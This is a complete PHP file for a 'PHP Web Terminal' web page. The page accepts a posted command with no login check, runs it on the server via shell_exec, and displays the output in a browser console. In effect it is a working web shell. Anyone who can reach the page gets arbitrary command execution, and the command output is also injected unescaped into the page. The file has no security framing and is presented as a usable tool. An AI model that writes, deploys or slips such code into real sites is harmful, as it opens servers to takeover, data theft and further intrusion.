<?php
session_start();

// Initialize command history
if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = [];
}

// Function to execute commands
function executeCommand($cmd) {
    if ($cmd === "clear") {
        $_SESSION['history'] = [];
        return ["cmd" => "clear", "output" => "", "time" => 0];
    }

    $start_time = microtime(true);
    $output = shell_exec("export TERM=xterm && " . escapeshellcmd($cmd) . " 2>&1");
    $execution_time = round(microtime(true) - $start_time, 4);
    return ["cmd" => $cmd, "output" => $output, "time" => $execution_time];
}

// Handle command execution
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $result = executeCommand($cmd);
    $_SESSION['history'][] = $result;
    echo json_encode($_SESSION['history']);
    exit;
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Terminal</title>
    <style>
        body {
            background-color: black;
            color: lime;
            font-family: monospace;
            margin: 0;
            padding: 10px;
        }
        #terminal {
            width: 100%;
            height: 90vh;
            overflow-y: auto;
            white-space: pre-wrap;
            border: 1px solid lime;
            padding: 5px;
        }
        input {
            background: black;
            color: lime;
            border: none;
            font-family: monospace;
            width: 100%;
            outline: none;
        }
        .command { color: cyan; }
        .time { color: yellow; font-size: 12px; }
    </style>
</head>
<body>

<div id="terminal"></div>

<form id="commandForm">
    <label>&gt; </label>
    <input type="text" name="cmd" id="cmd" autofocus autocomplete="off">
</form>

<script>
    const terminal = document.getElementById('terminal');
    const cmdInput = document.getElementById('cmd');
    const form = document.getElementById('commandForm');
    let commandHistory = [];
    let historyIndex = 0;

    function updateTerminal() {
        fetch('', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'fetch=true' })
            .then(response => response.json())
            .then(data => {
                terminal.innerHTML = '';
                data.forEach(entry => {
                    if (entry.cmd === "clear") {
                        terminal.innerHTML = "";  // Clear terminal screen
                    } else {
                        terminal.innerHTML += `<div class="command">&gt; ${entry.cmd}</div>`;
                        terminal.innerHTML += `<pre>${entry.output}</pre>`;
                        terminal.innerHTML += `<div class="time">(Execution Time: ${entry.time}s)</div>`;
                    }
                });
                terminal.scrollTop = terminal.scrollHeight;
            });
    }

    form.addEventListener('submit', function(event) {
        event.preventDefault();
        const command = cmdInput.value.trim();
        if (command === '') return;

        commandHistory.push(command);
        historyIndex = commandHistory.length;

        fetch('', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'cmd=' + encodeURIComponent(command)
        })
        .then(response => response.json())
        .then(data => {
            if (command === "clear") {
                terminal.innerHTML = ""; // Clear terminal instantly
            } else {
                let entry = data[data.length - 1];
                terminal.innerHTML += `<div class="command">&gt; ${entry.cmd}</div>`;
                terminal.innerHTML += `<pre>${entry.output}</pre>`;
                terminal.innerHTML += `<div class="time">(Execution Time: ${entry.time}s)</div>`;
            }
            terminal.scrollTop = terminal.scrollHeight;
        });

        cmdInput.value = '';
    });

    // Handle arrow key navigation in history
    cmdInput.addEventListener('keydown', function(event) {
        if (event.key === 'ArrowUp' && historyIndex > 0) {
            historyIndex--;
            cmdInput.value = commandHistory[historyIndex];
        } else if (event.key === 'ArrowDown' && historyIndex < commandHistory.length - 1) {
            historyIndex++;
            cmdInput.value = commandHistory[historyIndex];
        }
    });

    // Initial update
    updateTerminal();
</script>

</body>
</html>